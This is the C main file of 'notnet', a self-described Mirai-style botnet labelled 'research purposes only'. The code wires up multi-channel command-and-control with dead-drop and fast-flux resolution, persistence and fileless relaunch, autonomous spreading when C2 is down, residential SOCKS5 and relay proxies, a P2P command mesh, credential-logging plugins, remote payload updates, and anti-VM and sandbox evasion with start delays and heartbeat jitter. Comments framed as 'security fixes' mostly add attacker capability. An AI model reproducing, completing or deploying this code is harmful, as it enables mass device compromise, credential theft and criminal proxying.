/*
 * notnet - Modern Mirai-Style Botnet
 * Main entry point
 *
 * Research purposes only. Default scan rate: 30s interval.
 */
#include "config.h"
#include "protocol.h"
#include "spread.h"
#include "payload.h"
#include "persist.h"
#include "deaddrop.h"
#include "proxy.h"
#include "relay.h"
#include "plugin.h"
#include "killswitch.h"
#include "mesh.h"
#include "util.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <time.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>

/* ── Global State ───────────────────────────────────────────── */
notnet_bot_t g_bot;
static volatile int g_running = 1;

/* ── Signal Handlers ────────────────────────────────────────── */
static void signal_handler(int sig) {
    if (sig == SIGINT || sig == SIGTERM) {
        g_running = 0;
    }
}

/* Lock file descriptor (global so cleanup can close it) */
static int g_lock_fd = -1;

/* ── Initialization ─────────────────────────────────────────── */
static int init_bot(void) {
    /* Atomically create lock file with O_CREAT|O_EXCL to avoid TOCTOU.
     * O_EXCL fails with EEXIST if the file already exists (including symlinks).
     * This prevents symlink attacks in /tmp. */
    g_lock_fd = open("/tmp/notnet.lock", O_CREAT | O_EXCL | O_WRONLY, 0644);
    if (g_lock_fd < 0) {
        if (errno == EEXIST) {
            fprintf(stderr, "[notnet] Another instance running, exiting\n");
        } else {
            fprintf(stderr, "[notnet] Failed to create lock file: %s\n", strerror(errno));
        }
        return -1;
    }
    
    /* Write PID to lock file */
    char pid_str[16];
    int pid_len = snprintf(pid_str, sizeof(pid_str), "%d", getpid());
    if (write(g_lock_fd, pid_str, pid_len) != pid_len) {
        fprintf(stderr, "[notnet] Failed to write lock file\n");
        close(g_lock_fd);
        g_lock_fd = -1;
        unlink("/tmp/notnet.lock");
        return -1;
    }
    /* Keep fd open until cleanup to hold the lock */
    
    /* Initialize random seed */
    srand(time(NULL));
    
    /* Initialize bot state */
    memset(&g_bot, 0, sizeof(g_bot));
    
    /* Init timestamps */
    g_bot.last_update = time(NULL);
    g_bot.uptime = time(NULL);
    
    /* Self-identification */
    char hostname_buf[BOT_MAX_HOSTNAME_LEN];
    if (gethostname(hostname_buf, sizeof(hostname_buf)) != 0) {
        log_warn("gethostname() failed; using default hostname");
        snprintf(hostname_buf, sizeof(hostname_buf), "%s", "unknown");
    }
    snprintf(g_bot.hostname, BOT_MAX_HOSTNAME_LEN, "%s", hostname_buf);
    g_bot.scan_interval = SCAN_SLEEP_SEC;
    /* SECURITY FIX (#84): Default to persistence ON. Set persist_enabled=0
     * (config file or NOTNET_PERSIST_ENABLED=0) for RAM-only fileless mode. */
    g_bot.persist_enabled = 1;
    
    /* SECURITY FIX (#85): Fast-flux C2 off by default — one hostname
     * resolution per connect, identical to prior behavior. Set
     * flux_enabled=1 to rotate through all A records of the C2
     * hostnames every flux_ttl seconds. */
    g_bot.flux_enabled = 0;
    g_bot.flux_ttl = FLUX_DEFAULT_TTL;
    
    /* SECURITY FIX (#86): Dead-drop C2 off by default. Set dead_drop_url=
     * to a pastebin-style HTTP URL hosting the verified endpoint blob; the
     * blob must echo c2_secret or it is ignored (static config falls back). */
    g_bot.dead_drop_url[0] = '\0';
    g_bot.dead_drop_interval = DEAD_DROP_DEFAULT_INTERVAL;

    /* SECURITY FIX (#89): Residential SOCKS5 forward proxy. Off by default;
     * the accept thread only starts when proxy_enabled=1 AND a proxy_token
     * is configured (fail-closed). */
    g_bot.proxy_enabled = PROXY_DEFAULT_ENABLED;
    g_bot.proxy_port = PROXY_DEFAULT_PORT;

    /* SECURITY FIX (#91): ORB-style single-hop relay (Volt Typhoon
     * pattern). Off by default; the accept thread only starts when
     * relay_enabled=1 AND a relay_token is configured (fail-closed). */
    g_bot.relay_enabled = RELAY_DEFAULT_ENABLED;
    g_bot.relay_port = RELAY_DEFAULT_PORT;

    /* SECURITY FIX (#139): Decentralized P2P command/peer mesh. Off by
     * default; starts only when mesh_enabled=1 AND a relay_token is set
     * (MESH frames are auth'd with the shared fleet token) AND an
     * operator pubkey is baked in (fail-closed command verification). */
    g_bot.mesh_enabled = 0;
    g_bot.mesh_port = MESH_DEFAULT_PORT;
    g_bot.mesh_operator_pubkey[0] = '\0';
    for (int i = 0; i < MESH_PEER_MAX; i++) g_bot.mesh_static_peers[i][0] = '\0';

    /* SECURITY FIX (#92): Loader/plugin framework (Bredolab/Emotet
     * split) on by default. The `plugin` C2 command dispatches the
     * compile-time built-in plugins by name; plugin_enabled=0 disables
     * the framework. */
    g_bot.plugin_enabled = PLUGIN_DEFAULT_ENABLED;

    /* #314: legacy ?secret= drop-URL fallback is OPT-IN and defaults
     * OFF — a token-endpoint failure fails closed (drop skipped) so the
     * fleet secret never silently re-appears in victim command lines. */
    g_bot.allow_secret_fallback = 0;

    /* SECURITY FIX (#94): BYOVD defense-neutralization guard. Off by
     * default. The byovd plugin is a defensive-only research scaffold —
     * this repo ships no driver-loading code. When byovd_guard=1 its
     * load callback reports that BYOVD-style driver abuse is blocked. */
    g_bot.byovd_guard = BYOVD_GUARD_DEFAULT;

    /* SECURITY FIX (#93): Disposable-infrastructure C2 rotation. Off
     * by default — no backups configured, the chain is the primary
     * endpoint only. Configure c2_backup_1..4 = host:port (contiguous
     * from 1) and the bot rotates through the chain after
     * C2_ROTATE_FAIL_THRESHOLD consecutive HTTP connect failures,
     * capped at C2_ROTATE_MAX total rotations. bot_tag is the
     * affiliate/operator identifier reported in heartbeats. */
    g_bot.c2_backup_count = 0;
    g_bot.c2_rot_index = 0;
    g_bot.c2_fail_streak = 0;
    g_bot.c2_rotations = 0;
    g_bot.bot_tag[0] = '\0';
    g_bot.kill_pending = 0;
    
    /* Set default C2 config.
     * SECURITY FIX (#87): IRC C2 is deprecated — trivially sinkholed and
     * superseded by dead-drop resolution (#86). It is OFF by default
     * (c2_enabled starts 0 above) and is not auto-enabled by a non-default
     * port; only an explicit irc_enabled=1 in a config file turns it on.
     * HTTP/WS + dead-drop bootstrap are the primary channels. */
    strncpy(g_bot.c2_irc.server, IRC_DEFAULT_SERVER, sizeof(g_bot.c2_irc.server) - 1);
    g_bot.c2_irc.port = IRC_DEFAULT_PORT;
    strncpy(g_bot.c2_irc.channel, IRC_DEFAULT_CHANNEL, sizeof(g_bot.c2_irc.channel) - 1);
    
    strncpy(g_bot.c2_http.server, HTTP_DEFAULT_SERVER, sizeof(g_bot.c2_http.server) - 1);
    g_bot.c2_http.port = HTTP_DEFAULT_PORT;
    strncpy(g_bot.c2_http.path, HTTP_DEFAULT_PATH, sizeof(g_bot.c2_http.path) - 1);
    strncpy(g_bot.c2_http.user_agent, HTTP_USER_AGENT, sizeof(g_bot.c2_http.user_agent) - 1);
    
    strncpy(g_bot.c2_ws.server, WS_DEFAULT_SERVER, sizeof(g_bot.c2_ws.server) - 1);
    g_bot.c2_ws.port = WS_DEFAULT_PORT;
    strncpy(g_bot.c2_ws.path, WS_DEFAULT_PATH, sizeof(g_bot.c2_ws.path) - 1);
    
    /* Load config file if exists */
    load_config(&g_bot, "/etc/notnet.conf");

    /* SECURITY FIX (#2): Environment variable fallback for IRC password
     * if not set in config. */
    if (g_bot.c2_irc.pass[0] == '\0') {
        const char *env_pass = getenv("NOTNET_IRC_PASS");
        if (env_pass) {
            strncpy(g_bot.c2_irc.pass, env_pass, sizeof(g_bot.c2_irc.pass) - 1);
        }
    }

    /* SECURITY FIX (#35): Environment variable fallback for the shared
     * HTTP/WS command secret if not set in config. */
    if (g_bot.secret[0] == '\0') {
        const char *env_secret = getenv("NOTNET_C2_SECRET");
        if (env_secret) {
            strncpy(g_bot.secret, env_secret, sizeof(g_bot.secret) - 1);
            g_bot.secret[sizeof(g_bot.secret) - 1] = '\0';
        }
    }

    /* SECURITY FIX (#81): Environment variable fallback for the payload
     * SHA-256 pin if not set in config. */
    if (g_bot.payload_sha256[0] == '\0') {
        const char *env_hash = getenv("NOTNET_PAYLOAD_SHA256");
        if (env_hash && strlen(env_hash) == 64) {
            strncpy(g_bot.payload_sha256, env_hash, 64);
            g_bot.payload_sha256[64] = '\0';
        }
    }

    /* SECURITY FIX (#76): Environment variable fallback for the TLS cert
     * pin if not set in config. */
    if (g_bot.tls_cert_pin_sha256[0] == '\0') {
        const char *env_pin = getenv("NOTNET_TLS_CERT_PIN_SHA256");
        if (env_pin && strlen(env_pin) == 64) {
            strncpy(g_bot.tls_cert_pin_sha256, env_pin, 64);
            g_bot.tls_cert_pin_sha256[64] = '\0';
        }
    }

    /* SECURITY FIX (#84): Environment variable fallback for RAM-only
     * fileless mode. 0 = no persistence install, self-relaunch from an
     * anonymous memfd on Linux. Unlike the string keys above, a set env
     * var takes precedence over the config value — 0 is meaningful, so
     * "unset" and "set to 0" cannot share a sentinel. */
    const char *env_persist = getenv("NOTNET_PERSIST_ENABLED");
    if (env_persist) {
        g_bot.persist_enabled = (atoi(env_persist) != 0);
    }

    /* SECURITY FIX (#69): Environment variable fallbacks for the on-target
     * compilation source bundle. */
    if (g_bot.payload_source_sha256[0] == '\0') {
        const char *env_src = getenv("NOTNET_PAYLOAD_SOURCE_SHA256");
        if (env_src && strlen(env_src) == 64) {
            strncpy(g_bot.payload_source_sha256, env_src, 64);
            g_bot.payload_source_sha256[64] = '\0';
        }
    }
    if (g_bot.payload_source_url[0] == '\0') {
        const char *env_url = getenv("NOTNET_PAYLOAD_SOURCE_URL");
        if (env_url) {
            strncpy(g_bot.payload_source_url, env_url, sizeof(g_bot.payload_source_url) - 1);
            g_bot.payload_source_url[sizeof(g_bot.payload_source_url) - 1] = '\0';
        }
    }

    /* SECURITY FIX (#89): Environment variable fallback for the SOCKS5
     * proxy token if not set in config. Without a token the proxy refuses
     * to start (fail-closed). */
    if (g_bot.proxy_token[0] == '\0') {
        const char *env_tok = getenv("NOTNET_PROXY_TOKEN");
        if (env_tok) {
            strncpy(g_bot.proxy_token, env_tok, sizeof(g_bot.proxy_token) - 1);
            g_bot.proxy_token[sizeof(g_bot.proxy_token) - 1] = '\0';
        }
    }

    /* SECURITY FIX (#91): Environment variable fallback for the relay
     * token if not set in config. Without a token the relay refuses to
     * start (fail-closed). */
    if (g_bot.relay_token[0] == '\0') {
        const char *env_tok = getenv("NOTNET_RELAY_TOKEN");
        if (env_tok) {
            strncpy(g_bot.relay_token, env_tok, sizeof(g_bot.relay_token) - 1);
            g_bot.relay_token[sizeof(g_bot.relay_token) - 1] = '\0';
        }
    }

    /* SECURITY FIX (#5): Environment variable fallback for auth nicks */
    if (g_bot.c2_irc.auth_nick_count == 0) {
        const char *env_nicks = getenv("NOTNET_IRC_AUTH_NICKS");
        if (env_nicks) {
            char nicks_copy[512];
            strncpy(nicks_copy, env_nicks, sizeof(nicks_copy) - 1);
            nicks_copy[sizeof(nicks_copy) - 1] = '\0';
            char *saveptr = NULL;
            char *tok = strtok_r(nicks_copy, ",", &saveptr);
            while (tok && g_bot.c2_irc.auth_nick_count < 8) {
                while (*tok == ' ' || *tok == '\t') tok++;
                char *end = tok + strlen(tok) - 1;
                while (end > tok && (*end == ' ' || *end == '\t')) *end-- = '\0';
                if (*tok) {
                    strncpy(g_bot.c2_irc.auth_nicks[g_bot.c2_irc.auth_nick_count],
                            tok, 31);
                    g_bot.c2_irc.auth_nicks[g_bot.c2_irc.auth_nick_count][31] = '\0';
                    g_bot.c2_irc.auth_nick_count++;
                }
                tok = strtok_r(NULL, ",", &saveptr);
            }
        }
    }

    /* Defaults for scan limits (overridden by config) */
    if (g_bot.scan_timeout_ms == 0) g_bot.scan_timeout_ms = SCAN_TIMEOUT_MS;
    if (g_bot.scan_max_hosts == 0) g_bot.scan_max_hosts = 254;
    if (g_bot.heartbeat_interval == 0) g_bot.heartbeat_interval = HEARTBEAT_INTERVAL;
    /* #191: brute-force budget default (config key spread_budget_ms) */
    if (g_bot.spread_budget_ms == 0) g_bot.spread_budget_ms = SPREAD_BUDGET_DEFAULT_MS;
    /* ISSUE #159: DGA TLD default (dga_seed empty = DGA disabled) */
    if (g_bot.dga_tld[0] == '\0') {
        snprintf(g_bot.dga_tld, sizeof(g_bot.dga_tld), "%s", DGA_TLD_DEFAULT);
    }
    
    log_init();
    log_info("notnet v%s starting", NOTNET_VERSION);
    
    return 0;
}

/* ── Cleanup ────────────────────────────────────────────────── */
static void cleanup_bot(void) {
    log_info("notnet shutting down");
    
    /* Close and remove lock file */
    if (g_lock_fd >= 0) {
        close(g_lock_fd);
        g_lock_fd = -1;
    }
    unlink("/tmp/notnet.lock");

    /* Release the shared OpenSSL context (no-op when TLS not compiled in) */
    tls_cleanup();
    
    /* SECURITY FIX (#89): stop the residential SOCKS5 proxy accept thread
     * if it was started at boot or via 'proxy on'. */
    proxy_stop();
    /* SECURITY FIX (#91): stop the ORB relay accept thread if it was
     * started at boot or via 'relay on'. */
    relay_stop();
    /* SECURITY FIX (#139): stop the P2P mesh listener + gossip thread if
     * it was started at boot or via the mesh runtime path. */
    mesh_stop();
    
    /* Flush logs */
    log_flush();
    log_close();
}

/* ── Anti-VM / Anti-Sandbox (#159, SIMULATION-ONLY) ─────────── */
/* One-shot sweep, run before the main loop ONLY when anti_vm=1
 * (default 0 = never called). Returns 1 when an analysis environment
 * is detected. Checks (issue-specified):
 *   1. /sys/class/dmi/id/product_name contains QEMU/KVM/VirtualBox/VMware
 *   2. /proc/scsi/scsi contains "QEMU"
 *   3. Cowrie honeypot artifacts: /usr/bin/cowrie exists or hostname
 *      contains "cowrie"
 *   4. Fast-forward timing anomaly: two 100ms sleeps must take at least
 *      180ms of wall clock — sandboxes that accelerate sleep() fail this.
 * On a hit main() idles in hourly checks instead of exiting: exiting
 * instantly is itself a sandbox tell and abandons the implant; real
 * families idle on analysis boxes. */
static int anti_vm_sandbox_detected(void) {
    char buf[512];
    FILE *f;

    /* 1. DMI product name */
    f = fopen("/sys/class/dmi/id/product_name", "r");
    if (f) {
        size_t n = fread(buf, 1, sizeof(buf) - 1, f);
        fclose(f);
        buf[n] = '\0';
        if (strstr(buf, "QEMU") || strstr(buf, "KVM") ||
            strstr(buf, "VirtualBox") || strstr(buf, "VMware")) {
            return 1;
        }
    }

    /* 2. SCSI host adapter strings */
    f = fopen("/proc/scsi/scsi", "r");
    if (f) {
        size_t n = fread(buf, 1, sizeof(buf) - 1, f);
        fclose(f);
        buf[n] = '\0';
        if (strstr(buf, "QEMU")) return 1;
    }

    /* 3. Cowrie honeypot indicators */
    if (access("/usr/bin/cowrie", F_OK) == 0) return 1;
    if (gethostname(buf, sizeof(buf)) == 0 && strstr(buf, "cowrie")) return 1;

    /* 4. Timing fast-forward check */
    struct timespec t0, t1;
    clock_gettime(CLOCK_MONOTONIC, &t0);
    usleep(100000);
    usleep(100000);
    clock_gettime(CLOCK_MONOTONIC, &t1);
    long ms = (t1.tv_sec - t0.tv_sec) * 1000L +
              (t1.tv_nsec - t0.tv_nsec) / 1000000L;
    if (ms < 180) return 1;

    return 0;
}

/* ── Main Loop ──────────────────────────────────────────────── */
int main(void) {
    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);
    
    if (init_bot() != 0) {
        return EXIT_FAILURE;
    }

    /* SECURITY FIX (#130): Global killswitch — boot check. A bot whose
     * killswitch domain is armed self-destructs BEFORE it connects to
     * the C2, installs persistence, or starts any module. No runtime
     * config can change the domain; only a recompile can. */
    if (killswitch_check()) {
        kill_self(&g_bot, "global killswitch (boot)");
        cleanup_bot();
        return EXIT_SUCCESS;
    }

    /* SECURITY FIX (#92): Loader/plugin bootstrap. Register the
     * compile-time built-in plugins (spread, proxy, relay, cred-log)
     * and mark them loaded — existing module behavior is unchanged,
     * 'load' only flips registry state. Remote plugin fetch is future
     * work. Skipped entirely when plugin_enabled=0. */
    if (g_bot.plugin_enabled) {
        plugin_init();
        plugin_load_all(&g_bot);
        log_info("plugin system: %d built-in plugins registered, %d loaded",
                 plugin_count(), plugin_loaded_count());
    }
    
    /* SECURITY FIX (#84): RAM-only fileless mode first — this may replace
     * the process image from an anonymous memfd (fexecve). Then install
     * persistence unless persist_enabled=0. */
    persist_become_fileless(&g_bot);
    persist_install(&g_bot);
    
    /* SECURITY FIX (#86): Dead-drop C2 resolution runs at boot before any
     * channel connects. A verified blob overrides the static endpoints; a
     * failed, malformed, or unverified fetch leaves them as the fallback. */
    deaddrop_resolve(&g_bot);
    
    /* SECURITY FIX (#89): Residential SOCKS5 forward proxy. Starts the
     * accept thread at boot only when proxy_enabled=1 AND a proxy_token is
     * configured; 'proxy on' can also start it at runtime. The thread runs
     * independently of the C2 main loop. */
    if (g_bot.proxy_enabled && g_bot.proxy_token[0] != '\0') {
        if (proxy_start(&g_bot) == 0) {
            log_info("SOCKS5 proxy started on 0.0.0.0:%d", proxy_get_port());
        } else {
            log_warn("SOCKS5 proxy failed to start on port %u",
                     (unsigned)g_bot.proxy_port);
        }
    }

    /* SECURITY FIX (#91): ORB-style single-hop relay. Starts the accept
     * thread at boot only when relay_enabled=1 AND a relay_token is
     * configured; 'relay on' can also start it at runtime. */
    if (g_bot.relay_enabled && g_bot.relay_token[0] != '\0') {
        if (relay_start(&g_bot) == 0) {
            log_info("RELAY relay started on 0.0.0.0:%d", relay_get_port());
        } else {
            log_warn("RELAY relay failed to start on port %u",
                     (unsigned)g_bot.relay_port);
        }
    }

    /* SECURITY FIX (#139): P2P command/peer mesh. Starts at boot only when
     * mesh_enabled=1 AND a relay_token is configured (MESH frame auth) AND
     * an operator pubkey is baked in (fail-closed). Runs UNDER the C2
     * channels: when all C2 endpoints die, the fleet still relays
     * operator-signed commands peer-to-peer. */
    if (g_bot.mesh_enabled && g_bot.relay_token[0] != '\0') {
        if (mesh_start(&g_bot) == 0) {
            log_info("MESH peer mesh started on 0.0.0.0:%d", g_bot.mesh_port);
        } else {
            log_warn("MESH peer mesh failed to start on port %u",
                     (unsigned)g_bot.mesh_port);
        }
    }
    
    log_info("C2 protocols: IRC=%d HTTP=%d WS=%d",
             g_bot.c2_enabled & C2_IRC,
             g_bot.c2_enabled & C2_HTTP,
             g_bot.c2_enabled & C2_WS);

    /* ISSUE #159 (SIMULATION-ONLY): anti-VM / anti-sandbox sweep.
     * Runs ONCE before the main loop, only when anti_vm=1 (default 0 —
     * no sweep, unchanged boot). On detection the bot idles in hourly
     * checks rather than exiting (see anti_vm_sandbox_detected comment
     * for why idle beats exit). */
    if (g_bot.anti_vm) {
        if (anti_vm_sandbox_detected()) {
            log_info("sandbox detected, idling");
            while (g_running) {
                sleep(ANTI_VM_IDLE_CHECK_S);
            }
            cleanup_bot();
            return EXIT_SUCCESS;
        }
        log_info("anti_vm sweep clean");
    }

    /* ISSUE #159 (SIMULATION-ONLY): sleep-on-start (start_delay_s=,
     * 0..3600, default 0 = no delay). Evades sandbox runs that give up
     * early and desynchronizes fleet boot noise. */
    if (g_bot.start_delay_s > 0) {
        log_info("start delay: sleeping %u s before main loop",
                 (unsigned)g_bot.start_delay_s);
        sleep((unsigned int)g_bot.start_delay_s);
    }
    
    /* Heartbeat timer */
    time_t last_heartbeat = time(NULL);
    time_t last_dead_drop = time(NULL);   /* Dead-drop re-resolution timer (#86) */
    time_t last_killswitch = time(NULL);
    time_t last_spread = 0;               /* #188: spread deadline (0 = due now) */
    
    while (g_running) {
        /* Try to connect to C2 */
        protocol_connect_all(&g_bot);
        
        /* Process C2 commands */
        protocol_process_commands(&g_bot);

        /* SECURITY FIX (#93): the `kill` command is a one-way door —
         * the dispatch loop already wiped the cred buffer and stopped
         * proxy/relay/plugin stop callbacks; break here so
         * cleanup_bot() (lock removal, proxy/relay re-stop, log
         * flush) runs and main returns EXIT_SUCCESS (exit code 0). */
        if (g_bot.kill_pending) {
            log_info("kill: exiting cleanly — affiliate capacity handed back");
            break;
        }

        /* SECURITY FIX (#130): Global killswitch — periodic re-check on
         * its own timer. The author can arm (point the domain at the
         * kill address) or disarm (remove the record) at any time; the
         * kill works even when the operator's C2 is down. */
        if (time(NULL) - last_killswitch >= (time_t)KILLSWITCH_INTERVAL_DEFAULT) {
            if (killswitch_check()) {
                kill_self(&g_bot, "global killswitch");
                break;
            }
            last_killswitch = time(NULL);
        }
        
        /* Spread if not connected to primary C2 AND no live mesh peers.
         * The gate is the LIVE connection state, not the config-enabled
         * bitmask: a bot whose C2 is down (or disabled) falls back to
         * autonomous spreading, while a connected bot waits for operator
         * commands (#95). (#139): a bot with live P2P peers is also
         * operator-attached (the mesh can still deliver commands), so it
         * must not run spread_local either.
         * #188: spreading runs on its own scan_interval deadline instead of
         * the loop sleep — `sleep 3600` must not freeze command processing,
         * heartbeats, or the killswitch check for an hour. */
        if (!g_bot.c2_irc.connected && !g_bot.c2_http.connected &&
            !g_bot.c2_ws.connected && !mesh_has_peers() &&
            time(NULL) - last_spread >= (time_t)(g_bot.scan_interval > 0
                                                 ? g_bot.scan_interval : 1)) {
            log_info("Primary C2 unavailable, spreading locally");
            spread_local(&g_bot);
            last_spread = time(NULL);
        }
        
        /* Periodic heartbeat (on HEARTBEAT_INTERVAL timer, not every loop) */
        uint32_t hb_interval = (g_bot.heartbeat_interval > 0) ? g_bot.heartbeat_interval : HEARTBEAT_INTERVAL;
        /* ISSUE #159 (SIMULATION-ONLY): heartbeat jitter. When
         * heartbeat_jitter= is set (percent 0..50, default 0), the next
         * interval is base ± random(base*jitter/100), drawn from the
         * getrandom-backed random_uint32() in util.c — check-ins become
         * non-periodic (70%..130% of period at 30% jitter). Default 0:
         * span is 0 and the exact base interval applies, unchanged. */
        if (g_bot.heartbeat_jitter_pct > 0) {
            uint32_t jspan = hb_interval * g_bot.heartbeat_jitter_pct / 100;
            if (jspan > 0) {
                uint32_t r = random_uint32() % (2u * jspan + 1u);
                hb_interval = hb_interval - jspan + r;
            }
        }
        if (time(NULL) - last_heartbeat >= hb_interval) {
            protocol_send_heartbeat(&g_bot);
            last_heartbeat = time(NULL);
        }

        /* SECURITY FIX (#86): Periodic dead-drop re-resolution. A repointed
         * drop (e.g. the old C2 was sinkholed) takes effect on the next
         * connect attempt. Disabled when no dead_drop_url is configured. */
        if (g_bot.dead_drop_url[0] != '\0') {
            uint32_t dd_interval = (g_bot.dead_drop_interval > 0)
                                   ? g_bot.dead_drop_interval
                                   : DEAD_DROP_DEFAULT_INTERVAL;
            if (time(NULL) - last_dead_drop >= (time_t)dd_interval) {
                deaddrop_resolve(&g_bot);
                last_dead_drop = time(NULL);
            }
        }

        /* SECURITY FIX (#65): Periodic update check (every 6h by its own
         * internal timer). Previously payload_check_update() was dead code
         * — CMD_UPDATE was the only update path and it was a stub. */
        payload_check_update(&g_bot);

        /* #188: short fixed tick. scan_interval now gates only the spread
         * deadline (above), so `sleep`/scan_interval can no longer stall
         * command processing, heartbeats, dead-drop, or the killswitch. */
        usleep(1000000);
    }
    
    cleanup_bot();
    return EXIT_SUCCESS;
}
